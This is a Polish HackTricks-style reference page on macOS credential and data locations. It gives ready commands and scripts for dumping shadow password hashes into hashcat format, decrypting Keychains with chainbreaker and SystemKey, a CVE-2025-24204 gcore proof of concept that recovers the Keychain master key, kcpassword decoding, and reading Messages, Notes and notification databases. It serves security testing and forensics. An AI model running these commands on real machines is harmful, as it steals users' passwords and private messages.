# Wrażliwe lokalizacje i interesujące demony macOS

{{#include ../../../banners/hacktricks-training.md}}


## Hasła

### Hasła shadow

Hasło shadow jest przechowywane wraz z konfiguracją użytkownika w plikach plist znajdujących się w **`/var/db/dslocal/nodes/Default/users/`**.\
Poniższe polecenie one-liner można wykorzystać do zrzucenia **wszystkich informacji o użytkownikach** (w tym informacji o hashach):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Skrypty takie jak ten**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) lub [**ten**](https://github.com/octomagon/davegrohl.git) mogą służyć do konwertowania hasha do **formatu** **hashcat**.

Alternatywny one-liner, który zrzuci dane uwierzytelniające wszystkich kont niebędących kontami usługowymi w formacie hashcat `-m 7100` (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Innym sposobem uzyskania `ShadowHashData` użytkownika jest użycie `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Konwertowanie skopiowanego ShadowHashData w systemie Linux

Jeśli atrybut skopiowano na hosta do crackingu w systemie Linux, zapisz **wyłącznie jego bajty szesnastkowe** (bez etykiety `ShadowHashData:`) w pliku `shadowhash.hex`. W systemie Ubuntu narzędzie `libplist-utils` konwertuje zdekodowany binarny plik plist na czytelny XML, bez użycia macOS `plutil`.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

W XML użyj `iterations` oraz base64 `salt` i `entropy` z **`SALTED-SHA512-PBKDF2`**, a nie z oddzielnego weryfikatora SRP. Ustaw `salt_b64` i `entropy_b64` na zawartość odpowiednich elementów XML `<data>`. Zdekoduj je do postaci szesnastkowej i utwórz jeden wiersz w formacie `$ml$<iterations>$<salt_hex>$<entropy_hex>` dla trybu Hashcat `7100`. To zgadywanie offline po uzyskaniu uprzywilejowanego dostępu do hashy, a nie metoda uzyskania początkowego dostępu ani eskalacji uprawnień.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Ten plik jest używany **wyłącznie**, gdy system działa w **trybie jednego użytkownika** (czyli niezbyt często).

### Zrzut Keychain

Pamiętaj, że podczas używania binarnego pliku `security` do **zrzucenia odszyfrowanych haseł** pojawi się kilka monitów z prośbą o zgodę użytkownika na tę operację.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

W nowoczesnym macOS najciekawszymi magazynami danych są zazwyczaj **`~/Library/Keychains/login.keychain-db`** i **`/Library/Keychains/System.keychain`**. Są to pliki oparte na SQLite, ale dostęp do danych w postaci jawnej nadal pośredniczy **`securityd`**: kradzież surowej bazy danych daje głównie metadane i zaszyfrowane obiekty, chyba że uda się również odzyskać hasło użytkownika, `SystemKey` lub główny klucz przechowywany w pamięci.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Na podstawie tego komentarza [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) wygląda na to, że te narzędzia nie działają już w Big Sur.

### Omówienie Keychaindump

Opracowano narzędzie o nazwie **keychaindump**, które służy do wyodrębniania haseł z pęków kluczy macOS, ale ma ograniczenia w nowszych wersjach macOS, takich jak Big Sur, co wskazano w [dyskusji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Użycie **keychaindump** wymaga od atakującego uzyskania dostępu i eskalacji uprawnień do **root**. Narzędzie wykorzystuje fakt, że dla wygody pęk kluczy jest domyślnie odblokowywany po zalogowaniu użytkownika, dzięki czemu aplikacje mogą uzyskiwać do niego dostęp bez każdorazowego podawania hasła użytkownika. Jeśli jednak użytkownik zdecyduje się blokować pęk kluczy po każdym użyciu, **keychaindump** staje się nieskuteczne.

**Keychaindump** działa, atakując konkretny proces o nazwie **securityd**, opisywany przez Apple jako demon obsługujący autoryzację i operacje kryptograficzne, niezbędny do uzyskania dostępu do pęku kluczy. Proces wyodrębniania polega na odnalezieniu **klucza głównego** uzyskiwanego z hasła logowania użytkownika. Klucz ten jest niezbędny do odczytania pliku pęku kluczy. Aby znaleźć **klucz główny**, **keychaindump** skanuje stertę pamięci procesu **securityd** za pomocą polecenia `vmmap`, szukając potencjalnych kluczy w obszarach oznaczonych jako `MALLOC_TINY`. Do sprawdzenia tych lokalizacji pamięci służy następujące polecenie:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Po zidentyfikowaniu potencjalnych kluczy głównych **keychaindump** przeszukuje sterty w poszukiwaniu określonego wzorca (`0x0000000000000018`), który wskazuje kandydata na klucz główny. Do użycia tego klucza potrzebne są kolejne kroki, w tym usunięcie obfuskacji, opisane w kodzie źródłowym **keychaindump**. Analitycy skupiający się na tym obszarze powinni pamiętać, że kluczowe dane potrzebne do odszyfrowania pęku kluczy są przechowywane w pamięci procesu **securityd**. Przykładowe polecenie uruchamiające **keychaindump**:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) może w sposób zgodny z zasadami informatyki śledczej wyodrębnić z pęku kluczy macOS następujące typy informacji:

- Zahaszowane hasło do pęku kluczy, nadające się do łamania za pomocą [hashcat](https://hashcat.net/hashcat/) lub [John the Ripper](https://www.openwall.com/john/)
- Hasła internetowe
- Hasła ogólne
- Klucze prywatne
- Klucze publiczne
- Certyfikaty X509
- Bezpieczne notatki
- Hasła Appleshare

Po podaniu hasła odblokowującego pęk kluczy, klucza głównego uzyskanego za pomocą [volafox](https://github.com/n0fate/volafox) lub [volatility](https://github.com/volatilityfoundation/volatility), albo pliku odblokowującego, takiego jak SystemKey, Chainbreaker udostępni również hasła w postaci jawnego tekstu.

Bez użycia jednej z tych metod odblokowania pęku kluczy Chainbreaker wyświetli wszystkie pozostałe dostępne informacje.

#### **Zrzut kluczy pęku kluczy**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump kluczy keychain (z hasłami) za pomocą SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dumpowanie kluczy Keychain (z hasłami) i cracking hasha**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump kluczy pęku kluczy (wraz z hasłami) za pomocą memory dump**

[Wykonaj te kroki](../index.html#dumping-memory-with-osxpmem), aby przeprowadzić **memory dump**

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump kluczy pęku kluczy (z hasłami) przy użyciu hasła użytkownika**

Jeśli znasz hasło użytkownika, możesz użyć go do dumpowania i odszyfrowania pęków kluczy należących do użytkownika.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Klucz główny Keychain przez entitlement `gcore` (CVE-2025-24204)

W systemie macOS 15.0 (Sequoia) dostarczono `/usr/bin/gcore` z entitlementem **`com.apple.system-task-ports.read`**, dzięki czemu dowolny lokalny administrator (lub złośliwa podpisana aplikacja) mógł dumpować pamięć dowolnego procesu, nawet przy włączonych SIP/TCC. Dump pamięci `securityd` ujawnia **klucz główny Keychain** w postaci jawnej i pozwala odszyfrować `login.keychain-db` bez hasła użytkownika.<sup>[[1]](#references)</sup>

**Szybka reprodukcja na podatnych wersjach (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Przekaż wyodrębniony klucz hex do Chainbreaker (`--key <hex>`, aby odszyfrować login keychain. Apple usunęło entitlement w **macOS 15.3+**, więc działa to tylko na niezałatanych kompilacjach Sequoia lub systemach, na których zachowano podatny plik binarny.

### kcpassword

Plik **kcpassword** zawiera **hasło logowania użytkownika**, ale tylko wtedy, gdy właściciel systemu **włączył automatyczne logowanie**. Dzięki temu użytkownik zostanie zalogowany automatycznie, bez pytania o hasło (co nie jest zbyt bezpieczne).

Hasło jest przechowywane w pliku **`/etc/kcpassword`** po operacji XOR z kluczem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Jeśli hasło użytkownika jest dłuższe niż klucz, klucz zostanie użyty ponownie.\
Dzięki temu odzyskanie hasła jest dość łatwe, na przykład za pomocą skryptów takich jak [**ten**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesujące informacje w bazach danych

### Wiadomości

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Powiadomienia

Przed **Sequoia** bazę Notification Center można zwykle znaleźć w **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. W **Sequoia+** Apple przeniosło ją do chronionego przez TCC kontenera grupowego **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Większość interesujących informacji jest przechowywana w kolumnach **blob**, więc trzeba wyodrębnić tę zawartość i przekształcić ją do postaci czytelnej dla człowieka (`plutil -p -`, `strings` lub za pomocą prostego parsera). Przykłady szybkiej analizy triage:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Ostatnie problemy z prywatnością (baza danych NotificationCenter)

- W macOS **14.7–15.1** Apple przechowywało treść banerów w bazie SQLite `db2/db` bez odpowiedniego redagowania. CVE **CVE-2024-44292/44293/40838/54504** umożliwiały dowolnemu lokalnemu użytkownikowi odczytanie treści powiadomień innych użytkowników przez samo otwarcie bazy (bez monitu TCC).<sup>[[3]](#references)</sup>
- Apple ograniczyło to zagrożenie, przenosząc bazę do `group.com.apple.usernoted` i zabezpieczając ją przez TCC w nowszych kompilacjach Sequoia. Dlatego w obecnych systemach do odczytu zwykle potrzebny jest odpowiedni kontekst użytkownika lub obejście TCC.<sup>[[4]](#references)</sup>
- W starszych systemach skopiuj pliki `db`, `db-wal` i `db-shm` razem przed aktualizacją lub ponownym uruchomieniem, jeśli chcesz zachować artefakty.

### Notatki

Notatki użytkownika można znaleźć w `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Jeśli powyższy one-liner generuje zbyt dużo szumu, wyeksportuj `ZICNOTEDATA.ZDATA`, rozpakuj go za pomocą gunzip i sparsuj protobuf: zwykle jest to bardziej niezawodne niż bezpośrednie uruchamianie `strings` na bazie SQLite.

### Zadania w tle / elementy logowania

Od **Ventura** zatwierdzone przez użytkownika elementy logowania i kilka zadań w tle są śledzone w magazynach **BTM**, takich jak **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** oraz wersjonowana pamięć podręczna systemu **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Pliki te są przydatne do szybkiego identyfikowania mechanizmów persistence, narzędzi pomocniczych i niektórych elementów w tle zarządzanych przez MDM:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Jeśli chodzi o persistence i BTM internals, sprawdź [stronę z lokalizacjami autostartu](../../macos-auto-start-locations.md#login-items) oraz [notatki dotyczące Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferencje

W aplikacjach macOS preferencje znajdują się w **`$HOME/Library/Preferences`**, a w iOS — w `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

W macOS narzędzia CLI **`defaults`** można użyć do **modyfikowania pliku Preferences**.

**`/usr/sbin/cfprefsd`** rejestruje usługi XPC `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent`; można wywołać je w celu wykonania działań, takich jak modyfikowanie preferencji.

## OpenDirectory permissions.plist

Plik `/System/Library/OpenDirectory/permissions.plist` zawiera uprawnienia stosowane do atrybutów węzłów i jest chroniony przez SIP.\
Plik ten przyznaje określonym użytkownikom uprawnienia na podstawie UUID (a nie uid), dzięki czemu mogą uzyskać dostęp do konkretnych poufnych informacji, takich jak `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys`, między innymi:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Powiadomienia systemowe

### Powiadomienia Darwin

Głównym demonem obsługującym powiadomienia jest **`/usr/sbin/notifyd`**. Aby otrzymywać powiadomienia, klienci muszą zarejestrować się przez port Mach `com.apple.system.notification_center` (sprawdź je poleceniem `sudo lsmp -p <pid notifyd>`). Konfigurację demona określa plik `/etc/notify.conf`.

Nazwy używane w powiadomieniach są unikatowymi nazwami w notacji odwrotnej DNS. Gdy powiadomienie zostanie wysłane do jednej z nich, otrzymają je klienci, które zadeklarowały, że mogą je obsłużyć.

Można zrzucić bieżący stan (i wyświetlić wszystkie nazwy), wysyłając sygnał SIGUSR2 do procesu notifyd i odczytując wygenerowany plik: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Rozproszone centrum powiadomień

**Rozproszone centrum powiadomień**, którego głównym plikiem binarnym jest **`/usr/sbin/distnoted`**, to kolejny sposób wysyłania powiadomień. Udostępnia niektóre usługi XPC i wykonuje pewne kontrole, aby spróbować zweryfikować klientów.

### Apple Push Notifications (APN)

W tym przypadku aplikacje mogą rejestrować się w ramach **tematów**. Klient wygeneruje token, kontaktując się z serwerami Apple przez **`apsd`**.\
Następnie dostawcy również wygenerują token i będą mogli łączyć się z serwerami Apple, aby wysyłać wiadomości do klientów. Wiadomości te zostaną lokalnie odebrane przez **`apsd`**, który przekaże powiadomienie oczekującej na nie aplikacji.

Preferencje znajdują się w pliku `/Library/Preferences/com.apple.apsd.plist`.

Lokalna baza danych wiadomości w macOS znajduje się w `/Library/Application\ Support/ApplePushService/aps.db`, a w iOS w `/var/mobile/Library/ApplePushService`. Zawiera 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Można również uzyskać informacje o demonie i połączeniach za pomocą:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Powiadomienia użytkownika

Są to powiadomienia, które użytkownik powinien widzieć na ekranie:

- **`CFUserNotification`**: To API umożliwia wyświetlenie na ekranie wyskakującego okna z wiadomością.
- **Bulletin Board**: W systemie iOS wyświetla baner, który znika i jest przechowywany w Centrum powiadomień.
- **`NSUserNotificationCenter`**: Starsza usługa centrum powiadomień w macOS. W starszych wersjach baza danych zwykle znajduje się w `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; w Sequoia i nowszych została przeniesiona do `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – uprawnienie macOS gcore umożliwiało wyodrębnienie klucza głównego Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – ochrona danych Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – ujawnienie danych SQLite w Notification Center (CVE-2024-44292 i inne)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple rozwiewa obawy dotyczące prywatności bazy danych Notification Center w macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – łamanie haseł w macOS](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Przykładowe hashe Hashcat – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
